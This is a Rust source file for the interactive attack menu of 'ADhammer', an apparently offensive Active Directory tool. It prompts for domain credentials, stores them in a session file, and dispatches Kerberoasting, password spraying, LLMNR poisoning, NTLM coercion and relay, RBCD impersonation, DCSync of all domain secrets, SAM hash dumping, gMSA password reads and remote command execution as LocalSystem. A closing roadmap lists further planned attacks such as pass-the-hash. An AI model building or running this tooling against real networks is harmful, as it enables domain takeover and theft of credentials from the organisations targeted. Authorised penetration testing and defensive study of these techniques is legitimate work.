//! Interactive mode: `adhammer` prompts for domain creds, saves session, attack menu.
//! Reuse saved session with `adhammer --old`.

use anyhow::{Context, Result};
use dialoguer::{Confirm, Input, Password, Select};

use crate::session::{self, Session};
use crate::{
    abuse, coerce, dcsync, exec_cmd, gmsa, lsa, netenum, poison, rbcd, relay, roast, samr, scan,
    secretsdump, spray, AbuseArgs, CoerceArgs, DcsyncArgs, ExecArgs, GmsaArgs, LsaArgs, NetArgs,
    RbcdArgs, RelayArgs, SamrArgs, SecretsdumpArgs, SprayArgs,
};

enum Action {
    Scan,
    Roast,
    Spray,
    EnumSamr,
    EnumLsa,
    NetSweep,
    Abuse,
    Coerce,
    Rbcd,
    Dcsync,
    Capture,
    Poison,
    Relay,
    Exec,
    Secretsdump,
    Gmsa,
    ShowRoadmap,
    Exit,
}

const MENU: &[(&str, Action)] = &[
    ("Scan — passive audit (33 checks + graph)", Action::Scan),
    ("Roast — Kerberoast + AS-REP", Action::Roast),
    ("Spray — password spray", Action::Spray),
    ("Enum SAMR — list domain users", Action::EnumSamr),
    ("Enum LSA — name to SID", Action::EnumLsa),
    ("Net — network sweep", Action::NetSweep),
    ("Abuse — LDAP write (SPN / keycred / RBCD …)", Action::Abuse),
    ("Coerce — PetitPotam / PrinterBug", Action::Coerce),
    ("RBCD — impersonation chain", Action::Rbcd),
    ("DCSync — replicate secrets", Action::Dcsync),
    ("Capture — NTLM listener", Action::Capture),
    ("Poison — LLMNR / NBT-NS", Action::Poison),
    ("Relay — NTLM → LDAP shadow cred", Action::Relay),
    (
        "Exec — SVCCTL command as LocalSystem (psexec)",
        Action::Exec,
    ),
    (
        "Secretsdump — local SAM hashes (reg save + C$)",
        Action::Secretsdump,
    ),
    ("gMSA — read managed password → NT hash", Action::Gmsa),
    (
        "Show open vectors (VECTORS.md summary)",
        Action::ShowRoadmap,
    ),
    ("Exit", Action::Exit),
];

pub async fn run(use_old: bool) -> Result<()> {
    let sess = if use_old {
        session::load()?
    } else if session::exists()
        && Confirm::new()
            .with_prompt("Saved session found — reuse it? (No = enter new credentials)")
            .default(true)
            .interact()?
    {
        session::load()?
    } else {
        let s = setup_wizard()?;
        session::save(&s)?;
        s
    };

    loop {
        println!();
        println!("=== ADhammer ===");
        println!(
            "  domain: {}  dc: {}  user: {}",
            sess.domain, sess.dc, sess.username
        );
        println!();

        let labels: Vec<&str> = MENU.iter().map(|(l, _)| *l).collect();
        let idx = Select::new()
            .with_prompt("Choose action")
            .items(&labels)
            .default(0)
            .interact()
            .context("menu cancelled")?;

        match &MENU[idx].1 {
            Action::Exit => break,
            Action::ShowRoadmap => {
                print_roadmap_summary();
                continue;
            }
            action => {
                if let Err(e) = dispatch(action, &sess).await {
                    eprintln!("[-] {e:#}");
                }
            }
        }
    }

    Ok(())
}

fn setup_wizard() -> Result<Session> {
    println!("=== ADhammer setup ===");
    println!("Enter target domain credentials (saved for `adhammer --old`).\n");

    let domain: String = Input::new()
        .with_prompt("Domain (DNS)")
        .with_initial_text("corp.local")
        .interact_text()
        .context("domain prompt")?;

    let default_dc = format!("dc.{}", domain.trim());
    let dc: String = Input::new()
        .with_prompt("Domain controller (hostname or IP)")
        .with_initial_text(default_dc)
        .interact_text()
        .context("dc prompt")?;

    let username: String = Input::new()
        .with_prompt("Username")
        .with_initial_text("administrator")
        .interact_text()
        .context("username prompt")?;

    let password: String = Password::new()
        .with_prompt("Password")
        .interact()
        .context("password prompt")?;

    let insecure = Confirm::new()
        .with_prompt("Skip LDAPS certificate verification (lab DC)?")
        .default(true)
        .interact()
        .context("insecure prompt")?;

    Ok(Session {
        domain: domain.trim().to_string(),
        dc: dc.trim().to_string(),
        username: username.trim().to_string(),
        password,
        insecure,
    })
}

async fn dispatch(action: &Action, s: &Session) -> Result<()> {
    match action {
        Action::Scan => scan(s.scan_args()).await,
        Action::Roast => roast(s.scan_args()).await,
        Action::Spray => {
            let users: String = Input::new()
                .with_prompt("Users (@file or comma-separated)")
                .with_initial_text("@users.txt")
                .interact_text()?;
            let password: String = Password::new()
                .with_prompt("Password to spray")
                .interact()?;
            spray(SprayArgs {
                kdc: s.dc.clone(),
                realm: s.realm(),
                users,
                password,
            })
            .await
        }
        Action::EnumSamr => {
            samr(SamrArgs {
                host: s.dc.clone(),
                domain: s.netbios(),
                user: s.username.clone(),
                password: s.password.clone(),
                nt_hash: None,
            })
            .await
        }
        Action::EnumLsa => {
            let name: String = Input::new()
                .with_prompt("Account name to resolve")
                .with_initial_text("Administrator")
                .interact_text()?;
            lsa(LsaArgs {
                host: s.dc.clone(),
                domain: s.netbios(),
                user: s.username.clone(),
                password: s.password.clone(),
                nt_hash: None,
                name,
            })
            .await
        }
        Action::NetSweep => {
            let targets: String = Input::new()
                .with_prompt("Targets (CIDR, comma-list, or @file)")
                .with_initial_text("10.0.0.0/24")
                .interact_text()?;
            let deep = Confirm::new()
                .with_prompt(
                    "Deep checks (FTP·SMTP·DNS/AXFR·NFS·rsync·SNMP·RPC/EPM·WinRM·VNC·Redis)?",
                )
                .default(false)
                .interact()?;
            let zone = if deep {
                let z: String = Input::new()
                    .with_prompt("DNS zone for AXFR (blank to skip)")
                    .with_initial_text(&s.domain)
                    .allow_empty(true)
                    .interact_text()?;
                (!z.trim().is_empty()).then(|| z.trim().to_string())
            } else {
                None
            };
            netenum(NetArgs {
                targets,
                concurrency: 256,
                deep,
                zone,
                community: "public,private".to_string(),
            })
            .await
        }
        Action::Abuse => {
            let actions = [
                "add-spn",
                "add-member",
                "set-password",
                "add-keycred",
                "write-rbcd",
                "pkinit",
            ];
            let ai = Select::new()
                .with_prompt("Abuse action")
                .items(&actions)
                .default(0)
                .interact()?;
            let target: String = Input::new()
                .with_prompt("Target sAMAccountName")
                .interact_text()?;
            let value: String = Input::new()
                .with_prompt(
                    "Value (SPN / member / password / trustee SID — empty for pkinit key default)",
                )
                .allow_empty(true)
                .interact_text()?;
            abuse(AbuseArgs {
                url: Some(s.ldap_url()),
                user: Some(s.username.clone()),
                password: Some(s.password.clone()),
                insecure: s.insecure,
                action: actions[ai].to_string(),
                target,
                value,
                realm: Some(s.domain.clone()),
                kdc: Some(s.dc.clone()),
                ldap389: false,
                host: Some(s.dc.clone()),
            })
            .await
        }
        Action::Coerce => {
            let listener: String = Input::new()
                .with_prompt("Listener IP (where DC should auth to)")
                .interact_text()?;
            let pipes = ["lsarpc (PetitPotam)", "efsrpc", "spoolss (PrinterBug)"];
            let pi = Select::new()
                .with_prompt("Coercion vector")
                .items(&pipes)
                .default(0)
                .interact()?;
            let pipe = match pi {
                1 => "efsrpc",
                2 => "spoolss",
                _ => "lsarpc",
            };
            coerce(CoerceArgs {
                host: s.dc.clone(),
                domain: s.netbios(),
                user: s.username.clone(),
                password: s.password.clone(),
                listener,
                pipe: pipe.to_string(),
                target: None,
            })
            .await
        }
        Action::Rbcd => {
            let account: String = Input::new()
                .with_prompt("Controlled account (RBCD trustee)")
                .interact_text()?;
            let account_password: String = Password::new()
                .with_prompt("Controlled account password")
                .interact()?;
            let impersonate: String = Input::new()
                .with_prompt("User to impersonate")
                .with_initial_text("Administrator")
                .interact_text()?;
            let target_spn: String = Input::new()
                .with_prompt("Target service SPN (e.g. cifs/dc.corp.local)")
                .interact_text()?;
            rbcd(RbcdArgs {
                kdc: s.dc.clone(),
                realm: s.realm(),
                account,
                account_password,
                impersonate,
                target_spn,
            })
            .await
        }
        Action::Dcsync => {
            let all = Confirm::new()
                .with_prompt("Dump ALL domain accounts (full secretsdump)?")
                .default(false)
                .interact()?;
            let target: String = if all {
                String::new()
            } else {
                Input::new()
                    .with_prompt("Target account (empty = bind-only test)")
                    .allow_empty(true)
                    .interact_text()?
            };
            dcsync(DcsyncArgs {
                host: s.dc.clone(),
                domain: s.netbios(),
                user: s.username.clone(),
                password: s.password.clone(),
                target: if target.is_empty() {
                    None
                } else {
                    Some(target)
                },
                all,
            })
            .await
        }
        Action::Capture => {
            let listen: String = Input::new()
                .with_prompt("Listen address")
                .with_initial_text("0.0.0.0:445")
                .interact_text()?;
            smb2_client::server::capture(&listen)
                .await
                .map_err(Into::into)
        }
        Action::Poison => {
            let ip: String = Input::new()
                .with_prompt("Spoof IP (your capture listener)")
                .interact_text()?;
            let spoof_ip: std::net::Ipv4Addr = ip.parse().context("invalid IPv4")?;
            poison::poison(spoof_ip).await
        }
        Action::Relay => {
            let listen: String = Input::new()
                .with_prompt("SMB listen address")
                .with_initial_text("0.0.0.0:445")
                .interact_text()?;
            let target_object: String = Input::new()
                .with_prompt("Target object (sAMAccountName for shadow cred)")
                .interact_text()?;
            relay(RelayArgs {
                listen,
                target_dc: s.dc.clone(),
                realm: s.domain.clone(),
                target_object,
            })
            .await
        }
        Action::Exec => {
            let command: String = Input::new()
                .with_prompt("Command to run as LocalSystem")
                .with_initial_text("whoami")
                .interact_text()?;
            exec_cmd(ExecArgs {
                host: s.dc.clone(),
                domain: s.netbios(),
                user: s.username.clone(),
                password: s.password.clone(),
                nt_hash: None,
                command,
            })
            .await
        }
        Action::Secretsdump => {
            secretsdump(SecretsdumpArgs {
                host: s.dc.clone(),
                domain: s.netbios(),
                user: s.username.clone(),
                password: s.password.clone(),
                nt_hash: None,
            })
            .await
        }
        Action::Gmsa => {
            let target: String = Input::new()
                .with_prompt("gMSA sAMAccountName (e.g. gmsa_web$)")
                .interact_text()?;
            gmsa(GmsaArgs {
                url: s.ldap_url(),
                user: s.username.clone(),
                password: s.password.clone(),
                insecure: s.insecure,
                target,
            })
            .await
        }
        Action::ShowRoadmap | Action::Exit => Ok(()),
    }
}

fn print_roadmap_summary() {
    println!();
    println!("=== Open vectors (summary) ===");
    println!("  Audit:  badSuccessor OU-ACL depth, ESC15/EKUwu, ESC5/6/7/10");
    println!("  Attack: pass-the-ticket, pass-the-hash, constrained delegation");
    println!("          GMSA/LAPS read, cert enrollment (ESC1/3 exploit)");
    println!("          ESC8/11 relay, SVCCTL/TSCH remote exec");
    println!("          full-domain DCSync, orchestrated coerce→relay→pkinit");
    println!("  Stack:  LDAP channel binding, GSSAPI bind (feature flag)");
    println!("          SVCCTL · TSCH · RRPM · NETLOGON · WINRM clients");
    println!();
    println!("  Full matrix: VECTORS.md in the repo root (or next to the binary source).");
    println!("  Suggested close order: PTT → ESC5/7 passive → constrained del → GMSA/LAPS → SVCCTL/TSCH → cert enroll");
}
